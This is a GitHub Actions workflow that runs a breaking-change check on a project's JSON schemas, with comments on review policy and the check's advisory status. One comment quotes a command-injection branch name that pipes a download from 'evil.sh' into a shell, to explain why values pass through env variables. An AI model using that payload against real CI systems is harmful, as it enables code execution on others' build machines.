name: Contract breaking-change check

# scripts/breaking_schema_check.py — Azure's `BreakingChange` PR check, scoped to this repo.
#
# Diffs every changed traigent_schema/schemas/**/*.json file against its shape on the PR's
# base branch and classifies each difference BREAKING or non-breaking, using the
# request/response mirror-image rule table documented in the script's module docstring.
#
# POLICY, by owner decision on 2026-08-07: the rule is not "you may not break the contract" —
# it is "you may not break it silently": the change stays allowed, the silence does not. A
# genuine, reviewed tightening (e.g. adding a maxLength bound) is one
# scripts/breaking_schema_allowlist.json entry with a real `reason`, not a wall of work — a
# 2026-08-07 backtest against ~97 recent develop-line commits found 55 would have fired, the
# large majority a single already-shipped bound-hardening sweep, but that number describes
# unacknowledged history, not a backlog: the check only ever compares a PR's merge base to its
# head, so nothing historical needs retroactively acknowledging. Going forward each PR that
# tightens a bound adds its one allowlist line at review time.
#
# Placeholder reasons ("TODO", "see PR", a bare issue number) do NOT count as an
# acknowledgement — see reason_rejection() in the script. Allowlist entries do not expire: a
# bound-hardening decision is a permanent historical fact about that contract, not a lease.
#
# STATUS — this job is NOT currently a required status check (verified 2026-08-07 via
# `gh api repos/Traigent/TraigentSchema/rules/branches/<develop|main>`: develop's
# required_status_checks are ["Aikido Security: check code","ci-required","Analyze (python)",
# "Analyze (actions)","spine-trail present"]; main's do not list it either). The 2026-08-07
# "BLOCKING (ENFORCE)" header this replaced was the owner's policy decision, but the decision
# was never followed through into a ruleset change, so nothing actually blocked a merge on it.
# It also cannot simply be added as a required context as-is: the `on:` trigger below is
# path-scoped to `traigent_schema/schemas/**` + the check's own script/allowlist/workflow
# files, so it does not run at all on a PR that doesn't touch those paths — a required
# context that never reports leaves such a PR pending forever. `ci-required` (.github/
# workflows/ci.yml) is already required on develop and could in principle absorb this job,
# but `needs:` cannot cross workflow files in GitHub Actions, so joining them needs either a
# `workflow_call` bridge (unverified context-inheritance risk for BASE_REF/HEAD_SHA — see the
# issue below) or dropping the path filter so this job always runs. Tracked in
# TraigentSchema#392; until it closes, treat this job as advisory-only: it reports honestly on
# PRs that touch schema files, but nothing currently stops a merge if it goes red.

on:
  pull_request:
    paths:
      - "traigent_schema/schemas/**"
      - "scripts/breaking_schema_check.py"
      - "scripts/breaking_schema_allowlist.json"
      - ".github/workflows/breaking-schema-check.yml"
  workflow_dispatch:

permissions:
  contents: read

jobs:
  breaking-schema-check:
    name: Breaking schema change check
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"

      - name: Install package (needed for the traigent_schema.schemas path + referencing)
        run: |
          python -m pip install --upgrade --only-binary :all: pip
          pip install -e ".[dev]"

      # A branch name is attacker-controlled on a fork PR. Interpolating `${{ }}`
      # directly into `run:` splices it into the shell BEFORE the shell sees it,
      # so a ref named `x"; curl evil.sh | sh; "` executes. Aikido flagged exactly
      # this at critical severity on the first cut of this file -- in a workflow
      # whose whole purpose is to be a security gate. Passing through `env:`
      # keeps the value a shell VARIABLE, never shell SOURCE.
      - name: Ensure the PR base ref is available
        env:
          BASE_REF: ${{ github.event.pull_request.base.ref }}
        run: git fetch origin "$BASE_REF"

      - name: Run the breaking-change gate
        id: gate
        env:
          BASE_REF: ${{ github.event.pull_request.base.ref }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          python scripts/breaking_schema_check.py --check \
            --base-ref "origin/$BASE_REF" \
            --head-ref "$HEAD_SHA"

      - name: Explain on a BREAKING finding
        if: failure() && steps.gate.outcome == 'failure'
        run: |
          echo "::error title=Breaking schema change::scripts/breaking_schema_check.py found an un-acknowledged BREAKING contract change. The job log above names each finding and prints a ready-to-paste scripts/breaking_schema_allowlist.json entry."
          echo ""
          echo "Fix paths:"
          echo "  - If the break is unintended: revert the narrowing/tightening."
          echo "  - If the break is intentional and reviewed: copy the suggested JSON block from"
          echo "    the job log into scripts/breaking_schema_allowlist.json's \"entries\" array,"
          echo "    fill in a real reason (not 'TODO'/'see PR'/a bare issue number) + version + pr,"
          echo "    commit, and re-push."
